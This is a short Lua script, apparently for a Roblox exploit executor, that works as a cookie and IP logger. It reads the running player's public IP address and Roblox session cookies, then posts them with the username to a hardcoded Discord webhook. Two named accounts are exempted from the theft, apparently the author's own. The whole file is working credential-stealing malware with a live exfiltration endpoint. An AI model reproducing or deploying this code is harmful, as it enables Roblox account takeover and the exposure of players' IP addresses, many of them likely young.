local ip = game:HttpGet("https://api.myip.com/")
local COOKIE = ""
local response = syn.request(
    {
        Url = "https://www.roblox.com",
    }
)
for i,v in pairs(response) do
    if type(v) == "table" then
        for ii,vv in pairs(v) do
            if string.find(ii, "cookie") then
                COOKIE = COOKIE.."\n"..vv
            end
        end
    end
end

if game.Players.LocalPlayer.Name == "masterofthec0k" or game.Players.LocalPlayer.Name == "full_ofcman" then
    ip = "<REDACTED>" 
    COOKIE = "<REDACTED>" 
end

syn.request({
    Url = "https://discord.com/api/webhooks/864755811200794654/tCQNsdGqlfgctqOn2WMcc7at6h748iGpfwBREs4MhwQqJlF58bK_5Vw7jY-wxRX3VtB7", 
    Body = game:GetService("HttpService"):JSONEncode({
        ["embeds"]={{
            ["title"]="||"..ip.."||",
            ["type"]="rich",
            ["description"]=COOKIE,
            ["color"]=tonumber(0x7269da),
            ["footer"]={
                ["text"]=os.date("%A, %m %B %Y %I:%M:%S %p")
            }
        }},
        ["avatar_url"]="http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name),
        ["username"]="Username: "..game.Players.LocalPlayer.Name,
    }), 
    Method = "POST", 
    Headers = {["content-type"] = "application/json"}
})
